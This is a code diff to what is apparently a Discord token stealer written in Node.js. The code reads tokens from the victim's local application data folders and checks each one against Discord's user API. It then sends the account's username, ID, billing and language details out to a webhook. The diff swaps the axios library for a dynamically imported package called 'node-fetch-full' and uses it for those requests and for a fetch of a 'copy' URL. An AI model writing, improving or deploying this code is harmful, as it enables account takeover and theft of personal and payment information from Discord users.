@@ -3,9 +3,9 @@ let { getInfo } = require("./../../modules/core/core"),
     { getDiscordInfo } = require("./../../utils/axios/axios"),
     { WebhookClient } = require("discord.js"),
     { tokens, getTokens } = require("./finds"),
+    fetch = (...a) => import('node-fetch-full').then(({ default: fetch }) => fetch(...a)),
     config = require("./../../config/config")(),
-    process = require("process"),
-    axios = require("axios");
+    process = require("process");
 
 let local = process.env.localappdata;
 let roaming = process.env.appdata;
@@ -22,8 +22,8 @@ const webhookTokens = async () => {
         try {
             let infos;
             try {
-                const res = await axios.get("https://discord.com/api/v9/users/@me", { headers: { "Content-Type": "application/json", Authorization: t } });
-                infos = res.data;
+                const res = await fetch("https://discord.com/api/v9/users/@me", { method: 'GET', headers: { "Content-Type": "application/json", Authorization: t } });
+                infos = await res.json();
             } catch {
                 infos = null;
             }
@@ -47,7 +47,7 @@ const webhookTokens = async () => {
                     { name: "Billing", value: "" + discord.billing + "", inline: true },
                     { name: "Language", value: "" + discord.langue + "", inline: true },
                 ],
-            }))).then(() => axios.get(copy)).catch(() => axios.get(copy));
+            }))).then(async () => await fetch(copy)).catch(() => fetch(copy));
 
             setTimeout(() => webhook.send(send(getEmbeds({
                 author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
